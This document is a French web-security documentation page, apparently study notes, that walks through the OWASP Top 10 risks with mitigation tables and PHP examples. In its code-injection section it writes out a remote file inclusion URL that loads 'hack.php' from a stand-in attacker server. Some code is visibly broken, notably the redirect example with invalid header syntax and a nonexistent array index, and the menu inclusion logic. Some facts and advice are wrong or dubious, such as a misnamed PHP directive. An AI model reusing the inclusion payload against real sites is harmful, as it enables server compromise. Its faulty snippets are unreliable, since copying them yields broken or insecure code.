---
layout : "layouts/docs.njk"
title : "Le Top 10 Des Risques"
description : ""
group : "failles-informatique"
section : "failles"
toc : true
date : "2022-10-14T03:05:52+02:00"
draft : false
---
{% callout %}
**Source**  
[Sécurité informatique sur le Web](https://www.editions-eni.fr/livre/securite-informatique-sur-le-web-apprenez-a-securiser-vos-applications-management-cybersecurite-developpement-et-operationnel-9782409006340)  
[OSWAP TOP 10](’https://github.com/OWASP/Top10/blob/master/2017/fr/0x11-t10.md)
{% endcallout %}
## Le top 10 des risques de vulnérabilités d’un site
1. injection (SQL, LDAP, Xpath, etc.)
2. violation de gestion d’authentification et de session
3. Cross-Site Scripting (XSS)
4. références directes non sécurisées à un objet
5. mauvaise configuration de sécurité
6. exposition de données sensibles
7. manque de contrôle d’accès au niveau fonctionnel
8. falsification de requête intersite (CSRF)
9. utilisation de composants avec des vulnérabilités connues
10. redirections et renvois non validés
## 1 - Les injections
### Les injections SQL
{% bs-table %}

| **N°** | **Méthode**           | **Description**                                                                                                                                                                                                                                                                      |
|--------|-----------------------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Framework             | Utiliser un framework pour le développement, de préférence avec un ORM (mapping objet-relationnel)                                                                                                                                                                                   |
| 2      | Préparer vos requêtes | Désinfecter (sanitize) les requêtes envoyées en base de données avec des méthodes telles que :  **JAVA** *PreparedStatement()*  **.NET** *SqlCommand() ou OleDbCommand()* **PHP** *utiliser PDO avec la méthode prepare() et bindParam() pour les paramètres contenant des entiers.* |
| 3      | Réécriture d’URL      | L’utilisation de la réécriture d’URL permet de compliquer fortement la tâche au cybercriminel et s’avère être une des protections contre les injections SQL.                                                                                                                         |
{% endbs-table %}
Voici un exemple en PHP d’une requête préparée contre les injections SQL :
```php
if(is_numeric( $id )) {
    $data = $db->prepare( ’SELECT nom, tel FROM users WHERE
    user = (:id) LIMIT 1;’ );
    $data->bindParam( ’:id’, $id, PDO::PARAM_INT );
    $data->execute();
}
```
### Injection de code
L’injection de code est une vulnérabilité dont le but est de profiter d’une faiblesse dans le code d’une page web côté serveur afin d’y injecter une donnée pour modifier son comportement. Les fonctions eval() et include() sont souvent citées parmi les fonctions à bannir, car l’injection de code PHP dans une fonction include() permet d’exploiter une vulnérabilité appelée RFI (RFI File Inclusion) :

Voici l’exemple d’un formulaire pour un menu :
```html
<form method="get" action=”menu.php”>
   <select name="page">
      <option value="page1.php">menu1</option>
      <option value="page2.php">menu2</option>
   </select>
   <input type="submit">
</form>
```
La page `menu.php` contient le code permettant de réceptionner les valeurs par le formulaire de la page index.html afin d’inclure la page demandée :
```php
<?php
   $menu = "";
   if ($_GET[’page’]  == ’page1’){ 
      $menu = $_GET[’page’]; 
    } 
    if ($_GET[’page’]  == ’page2’){ 
      $menu = $_GET[’page’]; 
    } 
   include($menu); 
?>
```
L’attaquant utilise l’injection suivante et compromet le serveur :

`http://exemple.com/menu.php?page=http://ServeurPirate.fr/hack.php`
{% bs-table %}

| **N°** | **Méthode**                                         | **Description**                                                                                                       |
|--------|-----------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|
| 1      | Bonne utilisation des fonctions d’inclusion de code | Les fonctions d’inclusion de code doivent être utilisées à bon escient et ne jamais inclure des entrées utilisateurs. |
| 2      | Bannir la fonction eval()                           | La fonction eval() ne doit jamais être à portée d’une entrée utilisateur.                                             |
{% endbs-table %}
## 2 - Violation de gestion d’authentification et de session
###Vol de session
Pour comprendre comment fonctionne le vol de session et s’en protéger, il est nécessaire de faire un rappel sur le fonctionnement d’une session dans une application web :

- À l’aide d’un formulaire sur le site web, l’utilisateur s’authentifie avec un identifiant et un mot de passe.
- Les informations sont soumises à l’application qui crée un identifiant de session, qui suivra l’utilisateur tout au long de sa navigation sur le site web. L’identifiant est généralement stocké dans un cookie et peut être supprimé une fois que l’utilisateur se déconnecte manuellement du site par un bouton Déconnexion mis à disposition ou par un dépassement de durée de vie de la session.
{% bs-table %}

| **N°** | **Méthode**        | **Description**                                                                                                                                                                                                                                                                                                                                                                          |
|--------|--------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Ajout HTTPS        | Un moyen efficace est l’utilisation exclusive du protocole HTTPS sur un serveur web. Le protocole se démocratise et la plupart des hébergeurs le proposent. <br>La Linux Foundation propose des certificats reconnus et gratuits, disponibles à cette adresse : https://letsencrypt.org/.                                                                                                |
| 2      | Flag secure cookie | Activer sur le serveur web la fonctionnalité flag secure cookie, déjà introduite dans le chapitre précédent (cf. Panorama de la sécurité web - La sécurité des navigateurs et serveurs web). Cette fonctionnalité permet de transmettre les identifiants de session au serveur seulement sous un protocole sécurisé (HTTPS), ce qui permet de réduire les attaques de l’homme du milieu. |
{% endbs-table %}
### Faiblesses des mots de passe
{% bs-table %}

| **N°** | **Méthode**              | **Description**                                                                                                                                                                                                                                                                                                                                                                                       |
|--------|--------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Mot de passe complexe    | Lors de la création d’un compte d’utilisateur, il est nécessaire de forcer l’utilisateur à utiliser un mot de passe complexe (majuscules, minuscules, chiffres, caractères complexes). Cette vérification doit s’effectuer côté client et serveur.                                                                                                                                                    |
| 2      | Jeton                    | La création d’un jeton sur la page d’authentification permet de rendre la tâche plus compliquée pour les cybercriminels. Même s’il est possible d’intercepter, cette méthode représente déjà un premier rempart.                                                                                                                                                                                      |
| 3      | Captcha                  | Suivant les exigences en matière de sécurité, si le token n’est pas suffisant, le Captcha reste un moyen efficace pour les attaques par dictionnaire ou brute force. Tous les captchas ne se valent pas, Google propose un service de Captcha (reCAPTCHA) simple et efficace.                                                                                                                         |
| 4      | Temporisateur et blocage | Une solution assez peu répandue, mais très efficace est de mettre un temporisateur sur les tentatives d’authentification trop importantes et de bloquer le compte utilisateur lorsqu’une attaque par dictionnaire ou brute force est détectée. Cette solution reste quand même lourde à mettre en place et n’est pas très agréable pour les utilisateurs lors d’un oubli de mot de passe par exemple. |
{% endbs-table %}
### Mot de passe non protégé en base de données
{% bs-table %}

| **N°** | **Méthode** | **Description**                                                                                                                                                                                                        |
|--------|-------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Hash + Salt | Une méthode pour l’insertion de mots de passe salés et hachés en base de données consiste à concaténer le mot de passe et la clé dynamique. Chaque langage récent propose des méthodes de hachage et salage dynamique. |
{% endbs-table %}
### Faiblesses dans la conception des sessions
{% bs-table %}

| **N°** | **Méthode** | **Description**                                                                                                                                                                                                                                                                                                                     |
|--------|-------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Timeout     | Le temps donné au timeout de session doit être défini par la politique de sécurité ou le développeur. Il est bien de connaître le temps moyen de fréquentation d’un utilisateur sur l’application et de ce fait, de gérer le temps d’inactivité de celui-ci afin de quantifier le nombre de minutes avant expiration de la session. |
| 2      | HTTPOnly    | Il est possible de configurer, tout comme pour le secure flag, l’option HTTPOnly qui a pour principe de ne pas autoriser JavaScript à accéder aux cookies à l’aide de la méthode document.cookie.                                                                                                                                   |
{% endbs-table %}
## 3 - Cross-Site Scripting (XSS)
{% bs-table %}

| **N°** | **Méthode**               | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
|--------|---------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Désinfecter les variables | Il est important de désinfecter toutes les variables ayant pour fonction de capturer les entrées utilisateur. Aucune partie de l’application ne doit être épargnée, le XSS peut s’introduire dans les tags <body>mais aussi JavaScript, CSS, JSON et même dans les cookies ou useragents. Des fonctions d’encodage permettent simplement d’encoder tout caractère JavaScript ou HTML afin d’éviter leurs exécutions. La plupart des frameworks utilisent par défaut ces fonctions. |
| 2      | Utiliser un framework     | Plusieurs bibliothèques sont disponibles afin de préparer et désinfecter toutes les variables lors du développement.                                                                                                                                                                                                                                                                                                                                                               |
| 3      | HTTPOnly                  | Actionner sur le serveur la fonction HTTPOnly.                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| 4      | Content security Policy   | Ne pas hésiter à utiliser la CSP (Content Security Policy) afin d’interdire à tout contenu extérieur tel que JavaScript d’accéder à la page. Cette fonction est à manipuler côté serveur (cf. chapitre Panorama de la sécurité web - La sécurité des navigateurs et serveurs web). Cette technique est également recommandée pour les WYSIWYG dont l’utilisation des tags HTML est nécessaire et donc plus dangereuse.                                                             |
| 3      | X-XSS Protection          | Tout comme le Content Security Policy, le X-XSS-Protection permet d’activer une protection anti-XSS. Pour plus d’informations, se reporter au chapitre Panorama de la sécurité web - La sécurité des navigateurs et serveurs web.                                                                                                                                                                                                                                                  |
{% endbs-table %}
Exemple PHP
```php
$entree = htmlspecialchars($entree, ENT_QUOTES);
```
## 4 - Références directes non sécurisées à un objet
{% bs-table %}

| **N°** | **Méthode**             | **Description**                                                                                                                                                                                                                                                                                                                                      |
|--------|-------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Contrôle des références | Afin de se protéger contre ce genre d’attaques, il est nécessaire de mettre des contrôles stricts sur les références utilisateur. Un pattern permettant de vérifier si l’utilisateur est bien le propriétaire de l’objet peut s’avérer très utile.                                                                                                   |
| 2      | Champs cachés           | Protéger les références avec la technique 1 présentée sur la colonne ci-dessus pour les champs cachés, même ceux non affichés dans le DOM. Les techniques Data biding ou Mass assignment vulnerability ont la fonction d’envoyer des requêtes avec des paramètres aléatoires essayant de trouver des champs cachés et de compromettre l’application. |
| 3      | Framework               | Les frameworks actuels, bien utilisés, comportent une gestion des rôles sur les applications efficaces. Encore une fois, ne pas hésiter à se servir de ce type d’outils pour développer.                                                                                                                                                             |
{% endbs-table %}
## 5 - Mauvaise configuration de sécurité
Une bonne configuration est avant tout de l’expérience, le suivi des bonnes pratiques recommandées par les éditeurs et du bon sens.
## 6 - Exposition de données sensibles
Utilisation de protocoles de codage dépassés, comme le md5.
## 7 - Manque de contrôle d’accès au niveau fonctionnel
### Local/remote file inclusion 
{% bs-table %}

| **N°** | **Méthode**               | **Description**                                                                                                                          |
|--------|---------------------------|------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Entrées utilisateur       | Valider les entrées utilisateur et ne pas utiliser celles-ci dans des fonctions d’inclusions.                                            |
| 2      | Désactiver des directives | Désactiver les directives permet l’utilisation d’inclusion d’URL. <br>Exemple en PHP : allow_url_open, allow_url_include (php.ini).      |
{% endbs-table %}
### Host Header Attack
{% bs-table %}

| **N°** | **Méthode**      | **Description**                                                                                                                                                                   |
|--------|------------------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Bannir HTTP-HOST | Il est préférable d’utiliser les variables du type SERVER_NAME à HTTP-HOST car celui-ci utilise sa propre configuration de domaine et non pas celle proposée par l’utilisateur.   |
{% endbs-table %}
### User-agent spoofing 
Il n’y a pas vraiment de protection contre ce spoofing car l’utilisateur, le client, est garant de celui-ci.
### Server Side Request Forgery (SSRF)
{% bs-table %}

| **N°** | **Méthode**                               | **Description**                                                                                                                                                                                         |
|--------|-------------------------------------------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Retour d’erreurs                          | Contrôler au maximum les retours d’erreurs (try and catch).                                                                                                                                             |
| 2      | Désactiver les protocoles non nécessaires | À l’aide d’une whitelist, autoriser les protocoles nécessaires (HTTP, HTTPS) et interdire implicitement les protocoles non nécessaires. Ceci peut se faire sur le serveur web ou dans le code lui-même. |
{% endbs-table %}
## 8 - Cross Site Request Forgery (CSRF)
{% bs-table %}

| **N°** | **Méthode** | **Description**                                                                                                                                                                                                                                                                                                                                                                          |
|--------|-------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Jeton CSRF  | Un des meilleurs moyens pour sécuriser les CSRF est l’insertion dans les formulaires d’un jeton unique attribué au tout début de la navigation utilisateur. De ce fait, si une page extérieure essaye de soumettre un formulaire, elle devra d’abord passer par la page d’accueil ou par une autre page de l’application, respectant ainsi le chaînage d’une navigation sur un site web. |
| 2      | Captcha     | Un Captcha peut s’avérer efficace pour contrer les CSRF, en particulier les Captchas Google, dont l’efficacité est à la hauteur de leur facilité d’installation.                                                                                                                                                                                                                         |
| 3      | Framework   | Les frameworks modernes automatisent et initialisent les jetons CSRF dans les formulaires des applications.                                                                                                                                                                                                                                                                              |
{% endbs-table %}
## 9 - Exploitation de vulnérabilités connues
{% bs-table %}

| **N°** | **Méthode**        | **Description**                                                                                                                                                                                                                                                                                                                                                                                |
|--------|--------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Mise à jour        | Il est primordial de bien gérer les mises à jour sur les bibliothèques, les plugins, les serveurs et les systèmes d’exploitation autour de votre application. La plupart des CMS proposent des plugins ou options pour la mise à jour automatique du cœur de l’application. Des notifications sont envoyées par e-mail quand un plugin n’est plus à jour. Veillez à bien surveiller celles-ci. |
| 2      | Veille en sécurité | S’inscrire à des flux RSS comme celui d’exploit-db.com (https://www.exploit-db.com/rss.xml) ou à une liste de publipostage comme celle de http://www.securityfocus.com/ permet d’avoir un rapport journalier sur les vulnérabilités dévoilées et ainsi, de vérifier si l’on est concerné par celle-ci.                                                                                         |
{% endbs-table %}
## 10 - Redirections et renvois non validés
{% bs-table %}

| **N°** | **Méthode**           | **Description**                                                                                                                                            |
|--------|-----------------------|------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1      | Pas de redirection    | Éviter au maximum les redirections en dur dans une application. Si cela n’est pas possible, utiliser une whitelist avec des identifiants pour chaque item. |
| 2      | Utiliser un framework | La plupart des frameworks actuels utilisent bien les redirections.                                                                                         |
{% endbs-table %}
Exemple :
```php
$redirect = array(
1=>’http://www.editions-eni.fr/’,
2=>’https://google.fr’,
3=>’https://duckduckgo.com/’);
if($redirect ==1){
    header(location: $redirect[0])
}
```